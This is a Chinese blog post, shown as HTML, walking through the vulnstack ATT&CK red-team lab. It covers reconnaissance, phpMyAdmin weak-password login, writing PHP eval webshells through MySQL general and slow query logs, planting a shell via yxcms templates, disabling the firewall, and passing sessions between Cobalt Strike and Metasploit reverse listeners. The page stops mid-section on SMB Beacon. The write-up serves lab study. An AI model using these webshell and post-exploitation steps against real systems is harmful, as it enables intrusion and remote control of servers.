@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/tu.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/tu.ico">
+  <link rel="mask-icon" href="/images/tu.ico" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mayi077.github.io","root":"/","scheme":"Mist","version":"7.7.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":"ture","show_result":"ture","style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":"ture"},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":"ture","mediumzoom":false,"lazyload":"ture","pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":3,"unescape":"ture","preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="前言&amp;emsp;前面内网基础知识也是学了些了，感觉还是需要做系统点的实验，于是找到了【红日安全的红队实战系列】就先从一开始吧，加油加油。 环境搭建&amp;emsp;测试时我宿主机一直无法ping通win7，后面发现是防火墙给了限制，应该是题目环境需要特意禁用的。这里我为了方便就把他打开了。开启如下规则即可：下面开始介绍环境：靶机下载可以到官网下载：【详情】所有主机密码为：hongrisec@2019">
+<meta property="og:type" content="article">
+<meta property="og:title" content="vulnstack-ATT&amp;CK实战系列 红队实战（一）">
+<meta property="og:url" content="https://mayi077.github.io/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/index.html">
+<meta property="og:site_name" content="信安小蚂蚁">
+<meta property="og:description" content="前言&amp;emsp;前面内网基础知识也是学了些了，感觉还是需要做系统点的实验，于是找到了【红日安全的红队实战系列】就先从一开始吧，加油加油。 环境搭建&amp;emsp;测试时我宿主机一直无法ping通win7，后面发现是防火墙给了限制，应该是题目环境需要特意禁用的。这里我为了方便就把他打开了。开启如下规则即可：下面开始介绍环境：靶机下载可以到官网下载：【详情】所有主机密码为：hongrisec@2019">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bgy1gpft6n9f98j312s0kmmzw.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bgy1gpft93unslj30xs0g70zt.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/006Glg0Bgy1gpftmslkocj30j80ihjrv.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bgy1gpfu6gjdhfj31fy0pb0v9.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/006Glg0Bgy1gpfv6dqz3aj30is058t90.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bgy1gpfvzatopnj30yf0su773.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/006Glg0Bgy1gph79s6wbfj30ue0f674p.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bgy1gph7j4180bj30wr0ahdg0.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bgy1gph7mo0dwgj31h40lo41r.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/006Glg0Bgy1gph7qacgqtj30x70dygm0.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/006Glg0Bgy1gph7uuqj04j30sa0cv3ys.jpg">
+<meta property="og:image" content="https://tva3.sinaimg.cn/large/006Glg0Bgy1gph80luodxj30nw08uglu.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/006Glg0Bgy1gph86bis7wj31fk0ok78v.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/006Glg0Bgy1gph8s641qvj31fn0gd7jd.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/006Glg0Bgy1gpih25uqvyj30g80iower.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/006Glg0Bgy1gpiyxgqrxsj30qp0krabt.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/006Glg0Bgy1gpj1406ckqj317e0kradj.jpg">
+<meta property="og:image" content="https://tvax2.sinaimg.cn/large/006Glg0Bgy1gpj1x7qh4sj317e0mgad8.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/006Glg0Bgy1gpj20ht7kxj30k50dw74y.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bgy1gpj39cpia2j30jq0h5tdl.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bgy1gpj3hnprsoj30dm0c974r.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/006Glg0Bgy1gpj3tr89h6j30uc0dxdgj.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bgy1gpj3vtyzczj30du046jrb.jpg">
+<meta property="og:image" content="https://tvax4.sinaimg.cn/large/006Glg0Bgy1gpj3zqr5ioj30om09r3yv.jpg">
+<meta property="og:image" content="https://tva2.sinaimg.cn/large/006Glg0Bgy1gpji48bzsqj30me06o3yl.jpg">
+<meta property="og:image" content="https://tvax3.sinaimg.cn/large/006Glg0Bgy1gpji7rdusyj30mp09aaai.jpg">
+<meta property="og:image" content="https://tvax1.sinaimg.cn/large/006Glg0Bgy1gpjinrfqnuj30gw09a74f.jpg">
+<meta property="og:image" content="https://tva1.sinaimg.cn/large/006Glg0Bgy1gpjjrwf4g1j316o0b1jse.jpg">
+<meta property="og:image" content="https://tva4.sinaimg.cn/large/006Glg0Bgy1gpjjzx5xtoj317e0mgtbj.jpg">
+<meta property="article:published_time" content="2021-04-14T12:46:10.000Z">
+<meta property="article:modified_time" content="2021-04-14T12:47:02.000Z">
+<meta property="article:author" content="信安小蚂蚁">
+<meta property="article:tag" content="内网学习">
+<meta property="article:tag" content="内网靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tva1.sinaimg.cn/large/006Glg0Bgy1gpft6n9f98j312s0kmmzw.jpg">
+
+<link rel="canonical" href="https://mayi077.github.io/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>vulnstack-ATT&CK实战系列 红队实战（一） | 信安小蚂蚁</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">信安小蚂蚁</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right"></div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-归档">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-标签">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-关于">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://mayi077.github.io/2021/04/14/vulnstack-ATT-CK%E5%AE%9E%E6%88%98%E7%B3%BB%E5%88%97-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98%EF%BC%88%E4%B8%80%EF%BC%89/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="信安小蚂蚁">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="信安小蚂蚁">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          vulnstack-ATT&CK实战系列 红队实战（一）
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2021-04-14 20:46:10 / 修改时间：20:47:02" itemprop="dateCreated datePublished" datetime="2021-04-14T20:46:10+08:00">2021-04-14</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
+                    <span itemprop="name">内网学习</span>
+                  </a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>12k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>29 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;前面内网基础知识也是学了些了，感觉还是需要做系统点的实验，于是找到了<a href="http://vulnstack.qiyuanxuetang.net/vuln/?page=2" target="_blank" rel="noopener">【红日安全的红队实战系列】</a>就先从一开始吧，加油加油。</p>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>&emsp;测试时我宿主机一直无法ping通win7，后面发现是防火墙给了限制，应该是题目环境需要特意禁用的。这里我为了方便就把他打开了。开启如下规则即可：<br><img data-src="//tva1.sinaimg.cn/large/006Glg0Bgy1gpft6n9f98j312s0kmmzw.jpg" alt=""><br>下面开始介绍环境：<br>靶机下载可以到官网下载：<br><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/" target="_blank" rel="noopener">【详情】</a><br>所有主机密码为：<strong>hongrisec@2019</strong><br><img data-src="//tva1.sinaimg.cn/large/006Glg0Bgy1gpft93unslj30xs0g70zt.jpg" alt="拓扑图"></p>
+<a id="more"></a>
+<h3 id="VM1-也就是-win7"><a href="#VM1-也就是-win7" class="headerlink" title="VM1 也就是 win7"></a>VM1 也就是 win7</h3><p>首先我们知道他是一个web服务器拥有2张网卡，一个可以设置为<code>net</code>，一个设置为<code>仅主机</code>。默认只有一个网卡设备需要我们在vmware中添加，仅主机对应的是<code>VMnet1</code>我们可以在宿主机上找到网卡<code>VMnet1</code>指定好他的ip等，他的ip就是选用<code>仅主机</code>模式网卡的网关地址这里我设置的是<code>192.168.52.2</code>。还有就是我们有要求内网网段可以到vmware中的虚拟网络编辑器进行修改如图：  <img data-src="//tvax3.sinaimg.cn/large/006Glg0Bgy1gpftmslkocj30j80ihjrv.jpg" alt=""> 我将其设置为了52网段与前面设置的网关相匹配。<br>&emsp;随后我们进入win7系统，配置特定的ip地址网关等。但是有多个网卡驱动我们需要找到对应的根据mac地址（具体不说了，懂的都懂）然后进行修改。<br>这里我设置的<strong>内网：</strong>&emsp;   </p>
+<ul>
+<li>ip:<code>192.168.52.143</code>   </li>
+<li>网关:<code>192.168.52.2</code>   </li>
+<li>dns:<code>192.168.52.138</code>这个需要是后面主机中的dns服务器ip  </li>
+</ul>
+<p><strong>外网：</strong>  </p>
+<ul>
+<li>ip:<code>192.168.152.141</code>   </li>
+<li>网关:<code>192.168.152.2</code>这个也是和vmware中的配置相关的。   </li>
+<li>dns：<code>192.168.152.2</code> 意义不大</li>
+</ul>
+<p>随后进入c盘的phpstudy文件夹将phpstudy程序打开，宿主机可以输入ip测试是否配置成功（可能有延迟）<img data-src="//tvax4.sinaimg.cn/large/006Glg0Bgy1gpfu6gjdhfj31fy0pb0v9.jpg" alt="phpinfo"><br>说明配置的外网无问题，内网还需要进一步测试。</p>
+<h3 id="VM2-也就是-win2003"><a href="#VM2-也就是-win2003" class="headerlink" title="VM2 也就是 win2003"></a>VM2 也就是 win2003</h3><p>Win2K3域成员，我们只需要在vmware中将其网卡的模式调为仅主机，随后进入主机（需重新设置密码）配置网卡适配器为我们指定的即可，服务啥的已经开了。    </p>
+<ul>
+<li>ip: <code>192.168.52.141</code></li>
+<li>dns: <code>192.168.52.138</code>也是和dns有关</li>
+<li>网关: <code>192.168.52.2</code></li>
+</ul>
+<h3 id="VM3-也就是-win2008"><a href="#VM3-也就是-win2008" class="headerlink" title="VM3 也就是 win2008"></a>VM3 也就是 win2008</h3><p>它是域控，我们也是将其配置为仅主机模式，随后设置网卡配置如下:</p>
+<ul>
+<li>ip: <code>192.168.52.138</code></li>
+<li>dns: <code>192.168.52.138</code></li>
+<li>网关: <code>192.168.52.2</code></li>
+</ul>
+<h2 id="外网信息收集"><a href="#外网信息收集" class="headerlink" title="外网信息收集"></a>外网信息收集</h2><p>这里初始是我们知道了 <code>192.168.152.143</code> 这个ip有，那么我们可以搜一下c段以及开启了哪些端口有哪些网站目录备份文件等。</p>
+<h3 id="主机发现以及端口扫描"><a href="#主机发现以及端口扫描" class="headerlink" title="主机发现以及端口扫描"></a>主机发现以及端口扫描</h3><p>这里我们可以使用nmap命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sS 192.168.152.0&#x2F;24</span><br><span class="line"># -Pn 是不用ping命令区侦探，应该环境默认禁ping</span><br><span class="line"># 还可以使用 -sV 来列出 服务版本</span><br></pre></td></tr></table></figure>
+<p>既可以得到存活主机也可以得到开放端口服务，这里我们只关心<code>192.168.152.143</code></p>
+<p><img data-src="//tva4.sinaimg.cn/large/006Glg0Bgy1gpfv6dqz3aj30is058t90.jpg" alt=""><br>发现开启了80 web服务，135 RPC(Remote Procedure Call，远程过程调用)，3306 mysql服务。</p>
+<h3 id="扫描web站的信息，可以使用dirsearch"><a href="#扫描web站的信息，可以使用dirsearch" class="headerlink" title="扫描web站的信息，可以使用dirsearch"></a>扫描web站的信息，可以使用dirsearch</h3><p>使用dirsearch扫描，其它目录扫描工具皆可。<br><img data-src="//tva1.sinaimg.cn/large/006Glg0Bgy1gpfvzatopnj30yf0su773.jpg" alt="">。<br>发现了phpadmin、和beifen.rar备份文件，以及phpinfo.php和根目录有东西。</p>
+<h2 id="突破边界"><a href="#突破边界" class="headerlink" title="突破边界"></a>突破边界</h2><h3 id="利用phpMyadmin"><a href="#利用phpMyadmin" class="headerlink" title="利用phpMyadmin"></a>利用phpMyadmin</h3><h4 id="（1）、判断phpmyadmin版本"><a href="#（1）、判断phpmyadmin版本" class="headerlink" title="（1）、判断phpmyadmin版本"></a>（1）、判断phpmyadmin版本</h4><ol>
+<li>利用登录旁边的小问号打开phpMyadmin文档可以查看版本，问号跳转404了。（changelog.php）phpmyadmin为<code>3.5.8.2</code>，mysql为<code>5.5.53</code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">常用目录</span><br><span class="line">README</span><br><span class="line">ChangeLog</span><br><span class="line">doc&#x2F;html&#x2F;index.html</span><br><span class="line">Change</span><br><span class="line">changelog.php</span><br><span class="line">readme.php</span><br><span class="line">Documetation.html</span><br><span class="line">Documetation.txt</span><br><span class="line">translators.html</span><br></pre></td></tr></table></figure></li>
+<li>使用一切办法弄到密码登入后右下脚会有版本信息，这里显示phpstudy2014。</li>
+</ol>
+<h4 id="2-、phpMyAdmin-漏洞利用"><a href="#2-、phpMyAdmin-漏洞利用" class="headerlink" title="(2)、phpMyAdmin 漏洞利用"></a>(2)、phpMyAdmin 漏洞利用</h4><p>phpMyAdmin的漏洞多为经过验证后才能利用，所以需要进入后台。可以采用爆破的方式进入后台，弱口令或通过旁站的sql注入：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以用msf的auxiliary&#x2F;scanner&#x2F;http&#x2F;phpmyadmin_login模块进行爆破。（也是需要设置字典的）</span><br><span class="line">弱口令：</span><br><span class="line">root:root </span><br><span class="line">root:空</span><br><span class="line">mysql:mysql</span><br></pre></td></tr></table></figure>
+<p>得到 用户名root 、密码root</p>
+<h5 id="利用into-outfile-拿webshell"><a href="#利用into-outfile-拿webshell" class="headerlink" title="利用into outfile 拿webshell"></a>利用into outfile 拿webshell</h5><p>&emsp;直接利用into outfile 在网站根目录下写入webshell，前提条件如下：</p>
+<ol>
+<li>当前数据库有写权限。</li>
+<li>知道web绝对路径</li>
+<li>web路径可以写</li>
+</ol>
+<p><strong>判断是否有写权限：</strong><br>&emsp;执行如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%secure%&#39;;</span><br><span class="line">或者：</span><br><span class="line">select @@global.secure_file_priv</span><br></pre></td></tr></table></figure>
+<p>对应值的意思如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv&#x3D;NULL,禁止导入导出</span><br><span class="line">secure_file_priv&#x3D;&#39;&#39;,不限制导入导出</span><br><span class="line">secure_file_priv&#x3D;&#x2F;path&#x2F;,只能向指定目录导入导出</span><br></pre></td></tr></table></figure>
+<p>而我们这里是<code>NULL</code>所以没戏。</p>
+<h5 id="利用日志get-shell"><a href="#利用日志get-shell" class="headerlink" title="利用日志get shell"></a>利用日志get shell</h5><p>mysql5.0版本以上会创建日志文件，可以通过修改日志的全局变量getshell。</p>
+<ol>
+<li>查看日志状态：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%general%&#39;;</span><br></pre></td></tr></table></figure>
+<img data-src="//tva2.sinaimg.cn/large/006Glg0Bgy1gph79s6wbfj30ue0f674p.jpg" alt=""></li>
+<li>有图可知我们的日志服务是关闭的，我们打开<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log &#x3D; &quot;ON&quot;;</span><br></pre></td></tr></table></figure></li>
+<li>且我们有phpinfo知道的网站根目录在<code>C:/phpStudy/WWW</code> 那么我们执行如下命令设置指定日志文件路径<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D; &quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;log.php&quot;;</span><br></pre></td></tr></table></figure></li>
+<li>利用 <code>show variables like &quot;%general%&quot;</code>查看是否配置成功<img data-src="//tva1.sinaimg.cn/large/006Glg0Bgy1gph7j4180bj30wr0ahdg0.jpg" alt=""></li>
+<li>接下来我们只需要执行select一些一句话木马就可以写入文件里了。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php @eval($_GET[&#39;ma&#39;]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<img data-src="//tva1.sinaimg.cn/large/006Glg0Bgy1gph7mo0dwgj31h40lo41r.jpg" alt=""></li>
+<li>利用成功，接着我们可以直接用蚁剑或者其它的shell管理工具连接上，进行管理。</li>
+</ol>
+<h5 id="通过慢查询写webshell"><a href="#通过慢查询写webshell" class="headerlink" title="通过慢查询写webshell"></a>通过慢查询写webshell</h5><ol>
+<li>查看当前慢查询日志目录：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#39;%slow%&#39;;</span><br></pre></td></tr></table></figure>
+<img data-src="//tvax3.sinaimg.cn/large/006Glg0Bgy1gph7qacgqtj30x70dygm0.jpg" alt=""></li>
+<li>修改慢查询的日志路径，及开启慢查询<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL slow_query_log_file &#x3D; &quot;C:&#x2F;phpStudy&#x2F;WWW&#x2F;slow.php&quot;</span><br><span class="line">set GLOBAL slow_query_log&#x3D;on;</span><br><span class="line">再次查看</span><br><span class="line">SHOW VARIABLES LIKE &quot;%slow%&quot;</span><br></pre></td></tr></table></figure>
+<img data-src="//tvax1.sinaimg.cn/large/006Glg0Bgy1gph7uuqj04j30sa0cv3ys.jpg" alt=""></li>
+<li>我们需要注意一下慢查询时间，就是多久才算慢才回被记录在这个日志文件里：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@long_query_time</span><br></pre></td></tr></table></figure>
+<img data-src="//tva3.sinaimg.cn/large/006Glg0Bgy1gph80luodxj30nw08uglu.jpg" alt=""></li>
+<li>接着老样子，我们select一下危险代码并睡11秒语法多样<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT sleep(11),&quot;&lt;?php  @eval($_GET[mayi]);?&gt;&quot;</span><br></pre></td></tr></table></figure>
+<img data-src="//tvax1.sinaimg.cn/large/006Glg0Bgy1gph86bis7wj31fk0ok78v.jpg" alt="利用成功"></li>
+</ol>
+<p><a href="https://www.cnblogs.com/xhcbj/p/13356580.html" target="_blank" rel="noopener">【利用参考链接】</a><br><strong>一句马用get的话似乎用蚁剑连不上。</strong></p>
+<h3 id="利用-yxcms-getshell"><a href="#利用-yxcms-getshell" class="headerlink" title="利用 yxcms getshell"></a>利用 yxcms getshell</h3><p>还记得我们有个备份文件吗？<code>beifen.rar</code>解压是个<code>yxcms</code> 我们直接尝试访问一下，公告处存在账号密码<img data-src="//tvax1.sinaimg.cn/large/006Glg0Bgy1gph8s641qvj31fn0gd7jd.jpg" alt="">我们登入玩玩。<br>&emsp;登入后我们很容易找到模板管理这里，它可能存在漏洞点。我们可以更改文件内容，我们修改<code>index_index.php</code>测试，猜测他就是我们主页所访问到的。先写个<code>&lt;?php phpinfo();?&gt;</code>得到预期结果后我们直接写马吧。</p>
+<h2 id="上线Cobalt-strike-以及联动-msf"><a href="#上线Cobalt-strike-以及联动-msf" class="headerlink" title="上线Cobalt strike 以及联动 msf"></a>上线Cobalt strike 以及联动 msf</h2><p>&emsp;前面我们已经用蚁剑连上了webshell，我们可以执行系统命令而且是管理员权限。我们现在上线到CS，大概就是创建一个监听器，然后生成一个后门让win7来连接就行。最好关闭一下防火墙：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure>
+<h3 id="CS-gt-MSF"><a href="#CS-gt-MSF" class="headerlink" title="CS -&gt; MSF"></a>CS -&gt; MSF</h3><p><strong>MSF上执行如下命令进行监听：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_http</span><br></pre></td></tr></table></figure>
+<p>这个payload我前面一直掉，后面参试了其它的payload后才可以。注意一下架构。<br><strong>CS上执行如下操作：</strong><br>创建监听器，<code>windows/foreign/reverse_http</code><br><img data-src="//tvax3.sinaimg.cn/large/006Glg0Bgy1gpih25uqvyj30g80iower.jpg" alt=""></p>
+<p>随后执行监听器，在外面需要传递的beacon中执行<code>spawn msf</code> msf是外面定义的监听器名。</p>
+<p>随后回到msf就会发现上线成功。</p>
+<h3 id="MSF-gt-CS"><a href="#MSF-gt-CS" class="headerlink" title="MSF -&gt; CS"></a>MSF -&gt; CS</h3><p><strong>msf上操作：</strong>   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;local&#x2F;payload_inject</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_htt</span><br></pre></td></tr></table></figure>
+<p>并设置好参数</p>
+<p><strong>CS 上操作：</strong><br>创建一个 <code>windows/beacon_http/reverse_http</code> 监听器，并配置好参数，与上面对应。</p>
+<h2 id="Cobalt-Strike-上进行操作"><a href="#Cobalt-Strike-上进行操作" class="headerlink" title="Cobalt Strike 上进行操作"></a>Cobalt Strike 上进行操作</h2><h3 id="SMB-Beacon"><a href="#SMB-Beacon" class="headerlink" title="SMB Beacon"></a>SMB Beacon</h3><p>派生一个 <code>SMB Beacon</code>监听器，它通信更加隐蔽。 </p>
+<blockquote>
+<p>SMB Beacon 使用命名管道通过父级 Beacon 进行通讯，当两个 Beacons 链接后，子 Beacon 从父 Beacon 获取到任务并发送。因为链接的 Beacons 使用 Windows 命名管道进行通信，此流量封装在 SMB 协议中，所以 SMB Beacon 相对隐蔽，绕防火墙时可能发挥奇效</p>
+</blockquote>
+<p>简单来说，SMB Beacon有两种方式。第一种直接派生一个孩子，目的是进一步盗取内网主机的hash。第二种在已有的 Beacon 上创建监听，用来作为跳板进行内网穿透。<br><strong>注意事项：</strong>   </p>
+<ol>
+<li>具有SMB Beacon的主机必须接受端口445上的连接。</li>
